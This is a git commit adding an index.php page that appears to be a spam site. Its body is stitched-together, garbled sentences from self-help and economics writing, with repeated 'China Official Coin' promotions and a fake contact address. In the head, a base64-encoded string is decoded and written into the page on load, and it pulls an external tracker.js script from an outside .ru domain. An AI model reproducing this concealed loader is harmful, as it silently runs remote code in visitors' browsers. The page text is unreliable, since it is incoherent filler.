76674c471b2852dd6bb6498807461aeb6788677d
rjhrgeiv <81921599+rjhrgeiv@users.noreply.github.com>
2021-04-04 19:31:45 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9rdmJ4cjQ5bjZjcXAwbmF5cnEiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>In a word, he came to our room, fifteen minutes late, whic</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="ngm6kqsp8b06evorbad9xc">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="nup6654cs1hcq1a3sjtpk3">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>In a word, he came to our room, fifteen minutes late, whic</h1>
+	</section>
+
+
+	<section class="our-work" class="fqgeshphm9pzyxeyi67h1c0">
+		<h3 class="title">producing a limited number of goods, and diversifie</h3>
+		<p>If the broken element in the machine is replaced with a new one, but the same, the repair is made. China Official Coin: Singapore, South Korea, Malaysia.  Another friend of mine, a college teacher, had a terrible relationship with his teenage son.  Remember that quick fixes are just a mirage.  But the most amazing thing wasthat nearly every one of the 800 winners this year has achieved the same high sales and profit figures as last year's 40.  Part three.  They are used to form the price.  We initiate what is happening and are responsible for it.  In the presence of new expectations, the old deposits disappear.  A check is a document containing an order from the owner of a bank account to pay the amount specified in the check to a specific person.  Sellers usually keep some of the goods in stock in order to respond quickly to changes in demand.  The “inside-out” approach says that social victory is preceded by personal victory, that the ability to make and keep promises made to others is preceded by the ability to make and keep promises made to oneself.  Small-scale industries are generally not able to use the labor of a manager for their intended purpose. </p>
+		<hr>
+
+		<ul class="grid" class="p5v28dw57aqfwbqgq1gr">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="fqgeshphm9pzyxeyi67h1c0">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>The urgent is what needs immediate attention.  However, if the mistake is not acknowledged, corrected and not learned from it, then it </td>
+    <td>There are different techniques for bringing your imagination into contact with your values.  It defines the rights and forms </td>
+    <td>Therefore, Stephen also considered it possible to violate the agreement on his part: - Great, Dad! I bit my tongue and waited until dinner was</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>If I try to use the strategy and tactics of influencing people in order to get others to do what I want, to make them work better and with a greater de</td>
+    <td>And we would continue to share opinions until you clearly showed what you see, and I would not clearly show what I see.  Therefore, we proposed to t</td>
+    <td>This manner of listening is technique-based, divorced from character and relationships, and often offends those who are "listened to"</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>However, this does not negate the meaning of thinking and initiative of Square II, which can provide such interesting cre</td>
+    <td>In The Seven Habits of Highly Effective People, he offers us an opportunity, not an instruction, to answer the question "How?" This </td>
+    <td>Another powerful programmer is playing sports.  Your Personal Mission Statement will be more balanced and much easier to work with if you break it down into the sp</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="ngm6kqsp8b06evorbad9xc">
+		<h3 class="title">To love is to do something: to sacrifice s</h3>
+		<p>There are no exceptions.  Stimulating function.  You cannot ignore the urgent and important affairs of Quadrant I, although it will shrink as you spend more time on the precautionary and preparatory actions of Quadrant II.  Historical stages in the development of money: 1st stage - the emergence of money with the performance of their functions by random goods; 2nd stage - consolidation of the role of the universal equivalent for gold (this stage was the longest); 3rd stage - the stage of transition to paper or credit money; 4th stage - gradual ousting of cash from circulation, as a result of which electronic types of payments appeared.  By making and keeping promises to ourselves or others, we gradually work to ensure that our honor goes beyond our sentiments. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="nup6654cs1hcq1a3sjtpk3" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="fqgeshphm9pzyxeyi67h1c0">
+		<h3 class="title">High profits are recognized as the most effective and progressi</h3>
+		<p>" One afternoon I was sitting at home in my office writing, in particular, on the topic of patience. Chinese Coin: Sales Open In Today.  For the rest of the training participants, this case was only a confirmation of the company's value system and did not cause surprise.  They cannot be solved on a jump.  And see what happens to you.The deeper you begin to understand others, the more you value them, the more respectful you will be to them.  However, if the mistake is not acknowledged, corrected and not learned from it, then it will become a mistake of a different order.In this case, a person usually takes the path of self-deception and self-justification, logically justifying what happened for himself and for others.  What conditions need to be ensured to maintain synergy? What can you do to create these conditions? 4.  - Honey, Stephen just came in for a few minutes to help us.  You may want to review your personal mission statements as you ride the bus.  Expectations.  Clarifying expectations. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="p5v28dw57aqfwbqgq1gr" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="p5v28dw57aqfwbqgq1gr" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ngm6kqsp8b06evorbad9xc">
+		<h3 class="title">But other things being equal, a change in prices fo</h3>
+		<p>- But since you yourself are not talking specifically, I only have to act by exclusion.  The spirit of the Win / Win relationship cannot survive in an atmosphere of competition and rivalry.For the Win / Win principle to work, all systems must support it.  Take time to write down the imaginary funeral experiences we talked about at the beginning of this chapter.  You know, I have one serious problem.  “Lose / Win” Some are programmed differently - “Lose / Win”.  The Win / Win mindset presents life as an arena for collaboration, not competition.  19.CONSUMER BEHAVIOR THEORY Consumer behavior theory explains how shoppers spend their income in order to maximize their needs. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="nup6654cs1hcq1a3sjtpk3" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="fqgeshphm9pzyxeyi67h1c0">
+		<h3 class="title">To no less extent, it can help whole teams</h3>
+		<p>It seems like I can't keep the promise I made to myself.  Individually, each of them is useless.  It bordered on financial suicide.  17.  It requires a deeper understanding, careful analysis, thoughtful expressions and many revisions in search of the final version.  I was already ready to turn to the tactics of delegating execution: "Son, come here immediately and remove this rubbish now!" I knew that this way I would get my golden egg.  If other people do not perceive our efforts as a contribution, we tend to think that our good intentions are being neglected and we stop trying.  The first is the successful development of the enterprise, the constant increase in its scale through the concentration of capital.  In social terms, he was immature, he was always shy to talk even with loved ones. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="p5v28dw57aqfwbqgq1gr" class="title">Most people do not listen with the intent to understand, but wi</h3>	
+		<p>The monopoly regulatory institutions under consideration are exceptional.From an economic point of view, exclusivity means removing certain spheres of economic activity from the influence of purely market competitive mechanisms of self-regulation. China Official Coin: Singapore, South Korea, Malaysia.  The first speaker will be someone from your family or relatives who have come from all over the country - husband or wife, one of your children, brothers, sisters or nephews, your aunt or uncle, cousin or sister, grandfather or grandmother.  The consumer goods market is represented by consumer goods (food, clothing).  In the Nazi death camps, where Viktor Frankl comprehended the principle of proactivity, he also comprehended the importance of purpose and meaning in life.  However, each of them acquires more general utility for itself in comparison with the other side.  Let people learn from your mistakes and from the mistakes of others.  Subsidies, on the other hand, are considered to be a “reverse tax”.  Our relationship is very dear to me, and I want to understand you.  Although Gandhi did not have a personal cabinet or political office, he gradually, through compassion for others, personal courage, abstinence and the strength of a moral position - that is, through the expansion of his Circle of Influence - brought England to its knees and destroyed its political dominance over the three hundred million people of India ... </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="ngm6kqsp8b06evorbad9xc">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="nup6654cs1hcq1a3sjtpk3"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="fqgeshphm9pzyxeyi67h1c0"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="p5v28dw57aqfwbqgq1gr"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>76499 Feil Trace, Suite 373, 67949-2415, Wittingstad, Louisiana, United States</p>
+		<p>Phone number: +50(630)331-0889508</p>
+	</footer>
+
+</body>
+
+</html>
